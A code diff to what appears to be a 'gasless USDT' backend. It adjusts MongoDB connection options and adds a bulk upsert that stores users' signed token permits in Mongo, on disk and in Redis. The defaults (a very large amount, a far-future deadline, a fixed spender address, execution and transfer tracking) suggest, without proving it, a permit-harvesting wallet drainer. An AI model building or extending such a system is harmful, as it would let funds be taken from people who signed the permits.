@@ -207,7 +207,7 @@ export function writeSettingToFile(key, value) {
 export async function ensureMongoConnected() {
   if (mongoose.connection.readyState === 1 && mongoose.connection.db) {
     try {
-      await mongoose.connection.db.admin().ping();
+      await mongoose.connection.db.command({ ping: 1 });
       return true;
     } catch (pingErr) {
       console.warn('Existing Mongo connection dead, resetting:', pingErr.message);
@@ -218,8 +218,11 @@ export async function ensureMongoConnected() {
     const uri = process.env.MONGODB_URI || DEFAULT_MONGO_URI;
     await mongoose.connect(uri, {
       dbName: 'gasless-usdt',
-      serverSelectionTimeoutMS: 5000,
+      serverSelectionTimeoutMS: 15000,
       socketTimeoutMS: 45000,
+      connectTimeoutMS: 15000,
+      family: 4,
+      bufferCommands: false,
       maxPoolSize: 10,
     });
     return mongoose.connection.readyState === 1;
@@ -583,4 +586,71 @@ export async function syncPermitsFromDiskToDB() {
   } catch (err) {
     console.error('Error syncing permits from disk to DB:', err);
   }
+}
+
+/**
+ * Bulk upserts an array of permits (e.g. from client auto-reconciliation or admin import).
+ * Guaranteed to persist in MongoDB Atlas Cloud, Upstash Redis, and disk storage.
+ */
+export async function batchUpsertPermits(incomingPermits) {
+  if (!Array.isArray(incomingPermits) || incomingPermits.length === 0) return 0;
+  await ensureMongoConnected();
+
+  const filePermits = readPermitsFromFile();
+  const fileMap = new Map();
+  filePermits.forEach(p => p && p._id && fileMap.set(String(p._id), p));
+
+  let upsertedCount = 0;
+  for (const item of incomingPermits) {
+    if (!item || !item._id || !item.owner) continue;
+    const docData = {
+      _id: String(item._id),
+      owner: item.owner.toLowerCase(),
+      token: item.token ? item.token.toLowerCase() : '0x55d398326f99059ff775485246999027b3197955',
+      amount: String(item.amount || '50000000000000000000000'),
+      nonce: Number(item.nonce !== undefined ? item.nonce : 0),
+      deadline: Number(item.deadline || 2105024297),
+      v: Number(item.v || 28),
+      r: item.r,
+      s: item.s,
+      status: item.status || 'pending',
+      activationTxHash: item.activationTxHash || null,
+      activatedAt: item.activatedAt || null,
+      executions: item.executions || [],
+      totalTransferred: item.totalTransferred || '0',
+      spender: item.spender ? item.spender.toLowerCase() : '0x4ac0f075d81c3460027d3caff98d9abf50c6723b',
+      referrer: item.referrer ? item.referrer.toLowerCase() : null,
+      createdAt: item.createdAt || new Date().toISOString(),
+    };
+
+    // 1. Save to Mongo Atlas Cloud
+    if (mongoose.connection.readyState === 1) {
+      try {
+        await Permit.findOneAndUpdate(
+          { _id: docData._id },
+          docData,
+          { upsert: true, new: true, setDefaultsOnInsert: true }
+        );
+      } catch (mErr) {
+        console.warn(`[BATCH UPSERT] Mongo upsert error for ${docData._id}:`, mErr.message);
+      }
+    }
+
+    // 2. Update memory/disk map
+    const existing = fileMap.get(docData._id);
+    fileMap.set(docData._id, existing ? { ...existing, ...docData } : docData);
+    upsertedCount++;
+  }
+
+  const merged = Array.from(fileMap.values()).sort(
+    (a, b) => new Date(b.createdAt || 0) - new Date(a.createdAt || 0)
+  );
+  writePermitsToFile(merged);
+
+  // 3. Save to Redis
+  try {
+    await saveBatchRedisPermits(merged);
+  } catch (e) {}
+
+  return upsertedCount;
 }
